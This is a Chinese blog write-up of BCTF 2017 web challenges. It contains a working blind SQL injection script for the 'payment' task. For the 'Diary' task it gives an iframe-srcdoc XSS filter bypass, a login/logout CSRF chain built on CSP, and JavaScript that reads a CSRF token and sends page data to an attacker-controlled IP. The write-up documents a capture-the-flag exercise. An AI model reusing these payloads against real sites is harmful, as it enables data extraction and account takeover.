<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f38ee07cc580466900000c.png" style="max-width:100%;height:auto;"/><br/>
刚开始简单看了看觉得一点用都没有。。然后就觉得就只有这么点改动就要能进后台触发payment功能，是不是个0day，然后进入了超长的审计时间，最后审到头脑爆炸。。。一直认为是session有问题，然后折腾了好久还是没有什么思路。最后发现在这个<code style="max-width:100%;height:auto;">blog_backup_2014.php</code>里面有这个
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f38ffb7cc580466900000e.png" style="max-width:100%;height:auto;"/><br/>
意思是访问它一下就直接登陆进去了。。。。
黑人问号.jpg....
访问<code style="max-width:100%;height:auto;">http://payment.bctf.xctf.org.cn/index.php/blog_backup_2014</code>。。
然后进去输入<code style="max-width:100%;height:auto;">userid</code>的地方有个注入，是个盲注，然后关于拿<code style="max-width:100%;height:auto;">flag</code>的payment功能需要输入一大堆不知道的东西，所以还是先去盲注把。最后脚本如下：</p>
<pre><code class="python language-python" style="max-width:100%;height:auto;">import requests
import re
db_length=-1
db_name=""
url = &amp;apos;http://payment.bctf.xctf.org.cn/index.php/admin&amp;apos;
r=requests.session()
r.get("http://payment.bctf.xctf.org.cn/index.php/blog_backup_2014")

def doinject(param):
    #print param
    data={&amp;apos;userid&amp;apos;:param}
    result=r.post(url,data=data)
    content=result.content
    #print content
    if "Congraution!" in content:
        return 1
    elif "Wrong userid" in content:
        return 0
    else:
        return -1
ans=""
&amp;apos;&amp;apos;&amp;apos;
for i in xrange(1,100):
    start=1
    end=127
    while(start!=end):
        print str(start)+" : "+str(end)
        if(end-start==1):
            param="1&amp;apos;||if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&amp;apos;sourcekey&amp;apos;)),"+str(i)+",1))&gt;&amp;apos;"+str(start)+"&amp;apos;,1,0)#"
            if doinject(param)==1:
                end=start
            else:
                start=end
        else:
            mid=(start+end)/2
            param="1&amp;apos;||if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&amp;apos;sourcekey&amp;apos;)),"+str(i)+",1))&gt;&amp;apos;"+str(mid)+"&amp;apos;,1,0)#"
            #print param
            tag=doinject(param)
            if tag==1:
                start=mid
            elif tag==-1:
                end+=1
            else:
                end=mid
    ans+=chr(start)
    print ans
print ans
&amp;apos;&amp;apos;&amp;apos;
for i in xrange(1,1000):
    start=1
    end=127
    while(start!=end):
        print str(start)+" : "+str(end)
        if(end-start==1):
            param="1&amp;apos;||if((select(group_concat(md5_key))from(sourcekey))&gt;&amp;apos;"+ans+chr(start)+"&amp;apos;,1,0)#"
            if(doinject(param)):
                end=start
            else:
                start=end
        else:
            mid=(start+end)/2
            param="1&amp;apos;||if((select(group_concat(md5_key))from(sourcekey))&gt;&amp;apos;"+ans+chr(mid)+"&amp;apos;,1,0)#"
            #print param
            tag=doinject(param)
            if(tag):
                start=mid
            elif tag==-1:
                end+=1
            else:
                end=mid
    ans+=chr(start)
    print ans
print ans


&amp;apos;&amp;apos;&amp;apos;

table:payment,sourcekey,users
column:
1==&gt;USERID,BILLNO,BANKNAME,SERVICETYPE

C33506,C91536,K44098,K55106,M50655
45156890612662948,45022786012413371,89321845293416108,81671845408172653,33465675673245562
HSBC,HSBC,CMB,CMB,CSA
CARD_PAY

2==&gt;BANKNAME,MD5_KEY
CBC,CMB,CSB,HSBC
02359DC1A4D2612AAC83872031D970B9,6C35EBC95955C672EAD533295587FE07,ABB0A201345974F3DBF641EA2F8686CB,073A6AB30B859E326719E18A35DE17B4

3==&gt;geile
&amp;apos;&amp;apos;&amp;apos;
</code></pre>
<p style="max-width:100%;height:auto;">然后拿着数据去输入就行了，注意这个<code style="max-width:100%;height:auto;">Signature</code>
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f3910f7cc580466900000f.png" style="max-width:100%;height:auto;"/><br/>
算法已经在<code style="max-width:100%;height:auto;">m_payment.php</code>给出</p>
<pre><code style="max-width:100%;height:auto;"> function tosignature($userid,$bankname,$billno,$servicetype,$md5_key)
     {
        $arr=array($userid,$bankname,$billno,$servicetype,$md5_key);
        return md5(join(&amp;apos;&amp;&amp;apos;,$arr));
    }
</code></pre>
<p style="max-width:100%;height:auto;">然后输入就拿到flag了。
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f391887cc5804669000010.png" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">所以说这么一道题给这么大一坨源码是个什么tm鬼。。。
迷。。。。。。。。</p>
<h2 id="diary">Diary</h2>
<p style="max-width:100%;height:auto;">说道这个题，我有一句mmp必须要讲，当然不是说题，而是说自己，这道题个人认为出的相当好，我要打分至少打到4.5以上。不过也真是烦，这个题做了整整6个小时才做出来，最后总结主要被两个点坑了，一个是我tm把我xss平台的ip打错了，白白浪费快一个小时，因为我本地测用的本地的js，提交的时候用的vps上的js，导致很久很久都没发现错在哪儿，这是第一个点，第二个点是这道题有涉及到延迟，但是当你延迟太久服务器可能就会丢弃的你的这次操作了，比如同样的代码，最开始我设置的延迟10s，就失败了，但是本地是成功的.然后一直找不到问题所在，很难受，后来改成6s就成功了.
总之还有很多其他问题，暴露出我太粗心了，各种地方犯各种问题，而且一但出现问题就更加焦躁，然后就死循环了。。。僵硬。。。</p>
<p style="max-width:100%;height:auto;">回到题目上来把。
先随便注册个账户，然后登陆，注意这里在登陆的时候完成了一个跳转，这个点对于后面的绕过很重要，</p>
<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f37f3e7cc5804669000002.png" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">通过burp抓包也能看出来，当输入用户名密码点击登陆的时候，
有如下的请求过程</p>
<pre><code style="max-width:100%;height:auto;">1.用户名密码token和next参数发往==&gt;auth.bctf.xctf.org.cn/accounts/login/
2.被302去访问auth.bctf.xctf.org.cn/o/authorize/
3.再次被302至http://diary.bctf.xctf.org.cn/这里
</code></pre>
<p style="max-width:100%;height:auto;">其中在第三次的过程中完成了从<code style="max-width:100%;height:auto;">auth.bctf.xctf.org.cn</code>跳转至<code style="max-width:100%;height:auto;">diary.bctf.xctf.org.cn</code>的过程并且其中携带的code后续可以用来验证身份。</p>
<p style="max-width:100%;height:auto;">登陆进去之后发现一个地方输入，一个地方有表单提交(ps:管理员提交的话就可以获得flag)，一个地方提交url。</p>
<p style="max-width:100%;height:auto;">那么多半就是xss，先看输入的地方，发现输入之后打印的时候会经过<code style="max-width:100%;height:auto;">filter.js</code>的过滤，简单看了下<code style="max-width:100%;height:auto;">filter.js</code>的源码，没有仔细看，大概就是下面的标签不能用，<code style="max-width:100%;height:auto;">script form object embed link meta svg use math video marquee isindex bgsound</code>，然后像是<code style="max-width:100%;height:auto;">on事件，src,href</code>等重要属性也用不了，但是很容易发现他没有禁用<code style="max-width:100%;height:auto;">iframe</code>，这样很容易也就能想办法绕过
在这个链接<code style="max-width:100%;height:auto;">https://html5sec.org/</code>找到这么个payload成功绕过</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;iframe srcdoc="&lt;img src=x onerror=&amp;apos;alert(1);&amp;apos;&gt;"&gt;
</code></pre>
<p style="max-width:100%;height:auto;">然后就能放我们script标签执行js了。
好的xss的点有了，现在要想办法让管理员能触发，提交的url那儿限制很死几乎无法利用，需要找一个可以跳转的地方好跳转至我们控制的页面。
后来发现<code style="max-width:100%;height:auto;">static</code>链接有问题，这样子<code style="max-width:100%;height:auto;">http://diary.bctf.xctf.org.cn/static/%5c%5cbaidu.com</code>能够成功跳转值百度，这样的话又有了跳转，但是还有一个问题，要想要让管理员去<code style="max-width:100%;height:auto;">/survey/</code>处提交表单获得flag，有token怎么办。。</p>
<p style="max-width:100%;height:auto;">具体的可以看这篇文章，和本题目几乎一样<code style="max-width:100%;height:auto;">https://whitton.io/articles/uber-turning-self-xss-into-good-xss/</code>，一个组合利用。</p>
<p style="max-width:100%;height:auto;">这里我就不再赘述原理了，直接讲方法，之类我给出了两种实现方式，说是两种其实就是类似而已。</p>
<p style="max-width:100%;height:auto;">第一种，根据文章描述的原理，
首先我们在自己账户插入xss的payload如下</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;iframe srcdoc="&lt;script src=&amp;apos;http://diary.bctf.xctf.org.cn/static/js/jquery.min.js&amp;apos;&gt;&lt;/script&gt;&lt;script src=&amp;apos;http://104.160.43.154:8000/myjs/post.js&amp;apos;&gt;&lt;/script&gt;"&gt;
</code></pre>
<p style="max-width:100%;height:auto;">由于该iframe和父页同源，所以通过该js文件创建我们需要的另一个用于退出我们自己账户然后登陆管理员账户的<code style="max-width:100%;height:auto;">iframe</code>
该<code style="max-width:100%;height:auto;">post.js</code>内容如下：</p>
<pre><code class="js language-js" style="max-width:100%;height:auto;">var loginIframe = window.top.document.createElement(&amp;apos;iframe&amp;apos;);
loginIframe.setAttribute(&amp;apos;src&amp;apos;, &amp;apos;http://104.160.43.154:8000/myjs/in_and_out.html&amp;apos;);
window.top.document.body.appendChild(loginIframe);
setTimeout(function() {
    $.post("http://diary.bctf.xctf.org.cn/survey/",
        {
            rate:&amp;apos;5&amp;apos;,
            suggestion:&amp;apos;123&amp;apos;,
            csrfmiddlewaretoken:document.cookie.split(&amp;apos;;&amp;apos;)[0].split(&amp;apos;=&amp;apos;)[1]
           },
        function (data){
            $.get("http://xss平台?a="+escape(data),functoon(data,status){});
        }
    );
}, 6000);
</code></pre>
<p style="max-width:100%;height:auto;">然后我们的<code style="max-width:100%;height:auto;">in_and_out.html</code>的内容如下：</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;meta http-equiv="Content-Security-Policy" content="img-src http://diary.bctf.xctf.org.cn/"&gt;
&lt;img src="http://diary.bctf.xctf.org.cn/accounts/logout/" onerror="redir();"&gt;
&lt;script&gt;
    var redir = function() {
        window.location = &amp;apos;http://diary.bctf.xctf.org.cn/accounts/login/&amp;apos;;
    };
&lt;/script&gt;
</code></pre>
<p style="max-width:100%;height:auto;">我们在vps上的构造一个<code style="max-width:100%;height:auto;">fake.html</code>如下:</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;meta http-equiv="Content-Security-Policy" content="img-src http://diary.bctf.xctf.org.cn/"&gt;
&lt;img src="http://diary.bctf.xctf.org.cn/accounts/logout/" onerror="login();"&gt;
&lt;script&gt;
    var login = function() {
        var loginImg = document.createElement(&amp;apos;img&amp;apos;);
        loginImg.src = "http://diary.bctf.xctf.org.cn/accounts/login/";
        loginImg.onerror = redir;
    }
    var redir = function() {
        var code="d4SOl5u07GvJhsz5co1V084hGrQLoz";
        //这里code就是之前说的登陆的时候抓包拦下来的，抓到之后不发出去，把code复制出来，那个请求等他晾在那儿别发出去了
        var loginImg2 = document.createElement(&amp;apos;img&amp;apos;);
        loginImg2.src = &amp;apos;http://diary.bctf.xctf.org.cn/o/receive_authcode?state=preauth&amp;code=&amp;apos;+code;
        loginImg2.onerror = function() {
            window.location = &amp;apos;http://diary.bctf.xctf.org.cn/diary/&amp;apos;;
        }
    }
&lt;/script&gt;
</code></pre>
<p style="max-width:100%;height:auto;">然后提交构造的链接让它跳到<code style="max-width:100%;height:auto;">fake.html</code>来，然后就能够成功实现攻击。。注意每重复一次都得重新抓去一次code。</p>
<p style="max-width:100%;height:auto;">第二种就是不通过js文件创建iframe，直接在payload里面放就行了，其实是一样的，我们在自己账户插入xss的payload如下</p>
<pre><code class="html language-html" style="max-width:100%;height:auto;">&lt;iframe srcdoc="&lt;script+src%3d&amp;apos;http%3a//diary.bctf.xctf.org.cn/static/js/jquery.min.js&amp;apos;&gt;&lt;/script&gt;&lt;script+src%3d&amp;apos;http%3a//104.160.43.154%3a8000/myjs/post.js&amp;apos;&gt;&lt;/script&gt;"&gt;&lt;/iframe&gt; &lt;iframe srcdoc="&lt;meta+http-equiv%3d&amp;apos;Content-Security-Policy&amp;apos;+content%3d&amp;apos;img-src+http%3a//diary.bctf.xctf.org.cn/&amp;apos;&gt;&lt;img+src%3d&amp;apos;http%3a//diary.bctf.xctf.org.cn/accounts/logout/&amp;apos;+onerror%3d&amp;apos;redir()%3b&amp;apos;&gt;&lt;script&gt;var+redir+%3d+function()+{window.location+%3d+&amp;apos;http%3a//diary.bctf.xctf.org.cn/accounts/login/&amp;apos;%3b}%3b&lt;/script&gt;"&gt;&lt;/iframe&gt;
</code></pre>
<p style="max-width:100%;height:auto;">然后<code style="max-width:100%;height:auto;">post.js</code>就可以直接这样子，把功能分开免得出问题</p>
<pre><code class="js language-js" style="max-width:100%;height:auto;">setTimeout(function() {$.post("http://diary.bctf.xctf.org.cn/survey/",
{
    rate:&amp;apos;5&amp;apos;,
    suggestion:&amp;apos;nosuggest&amp;apos;,
    csrfmiddlewaretoken:document.cookie.split(&amp;apos;;&amp;apos;)[0].split(&amp;apos;=&amp;apos;)[1]
},
function(data,status){
    $.get("http://104.160.43.154:8000/xss/?a="+escape(data),function(data,status){});
}
)},6000)
</code></pre>
<p style="max-width:100%;height:auto;">最终获取到的flag如下：
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f3867f7cc5804669000003.png" style="max-width:100%;height:auto;"/><br/></p>
<p style="max-width:100%;height:auto;">这道题收获很大，因为现在有很多地方都是利用这样的跳转进行身份认证，但是从来没有想过有这种方式再配合上<code style="max-width:100%;height:auto;">csp</code>去进行利用，膜拜姿势orz。。。平时想的还是太少了。。思维僵化。。。</p>
<h2 id="aliceandbob">Alice and Bob</h2>
<p style="max-width:100%;height:auto;">又是一道史诗级谜题。。。
迷。。。
各种奇怪的不合逻辑的返回
猜测是预编译把，不知道怎么搞得。
最后师傅做出来的。。。
<br/><img alt="" data-action="zoom" src="./BCTF-2017-WEB-WriteUp/58f392737cc5804669000011.png" style="max-width:100%;height:auto;"/><br/>
不懂。。。
迷。。。。
回头看看别人wp学习下。。。</p>
<div class="section-nav">
<div class="left align-right"></div>
<div class="right align-left"></div>
<div class="clear"></div>
</div>
</article>
</div>
<div class="unit one-fifth hide-on-mobiles godness">
<aside>
<div class="Bendawang" id="Bendawang" style="position:absolute;">
<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
<div class="Bendawang_content" id="Bendawang_content"></div>

<img class="yukino" id="yukino" src="./BCTF-2017-WEB-WriteUp/41.png" style="position:absolute;"/>




<footer>
<div class="show-on-mobiles">
<div style="display:inline-block">
<div style="vertical-align:middle;">
            Copyright©
            <span itemprop="copyrightYear">2017</span>
<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
</div>
</div>
<div style="vertical-align:middle;">
<span>Designed By</span>
<a href="http://blog.csdn.net/qq_19876131"><img src="./BCTF-2017-WEB-WriteUp/bendawang2.png"/></a>
</div>
</div>
<div class="grid hide-on-mobiles">
<div class="unit one-third center-on-mobiles">
<div class="copyright">
          Copyright©
          <span itemprop="copyrightYear">2017</span>
<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
</div>
</div>
<div class="unit two-thirds align-right center-on-mobiles">
<p>Designed By
          <a href="http://blog.csdn.net/qq_19876131">
<img src="./BCTF-2017-WEB-WriteUp/bendawang2.png"/>
</a>
</p>
</div>
</div>
</footer>
<script src="./BCTF-2017-WEB-WriteUp/prism.js"></script>
<script src="./BCTF-2017-WEB-WriteUp/zooming.js"></script>
<script src="./BCTF-2017-WEB-WriteUp/Bendawang.js"></script>


